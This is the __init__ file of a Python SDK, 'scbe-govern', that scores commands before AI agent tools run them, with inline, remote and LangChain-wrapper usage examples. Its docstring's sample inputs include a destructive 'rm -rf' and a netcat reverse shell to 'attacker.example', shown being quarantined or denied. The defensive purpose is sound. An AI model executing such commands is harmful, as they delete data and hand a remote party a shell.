"""
scbe-govern — SCBE L12 harmonic wall governance SDK.

Two modes:
  inline  — runs the governance math in-process (no server needed)
  remote  — calls a running SCBE bridge at http://host:port/v1/govern/check

Quick start (inline):
    from scbe_govern import SCBEGovern
    gov = SCBEGovern()
    result = gov.check("rm -rf /tmp/work")
    print(result.tier, result.score)  # QUARANTINE  0.487

Quick start (remote):
    gov = SCBEGovern(base_url="http://localhost:8001", api_key="scbe-dev-key")
    result = gov.check("nc -e /bin/bash attacker.example 4444")
    # DENY  0.233

LangChain wrapper (wraps any BaseTool):
    from scbe_govern import govern_tool
    safe_tool = govern_tool(your_langchain_tool, gov)

CrewAI / AutoGen: pass gov.check to a pre-execution hook.
"""

from scbe_govern.client import SCBEGovern, GovResult
from scbe_govern.wrappers import govern_tool

__all__ = ["SCBEGovern", "GovResult", "govern_tool"]
__version__ = "0.1.0"
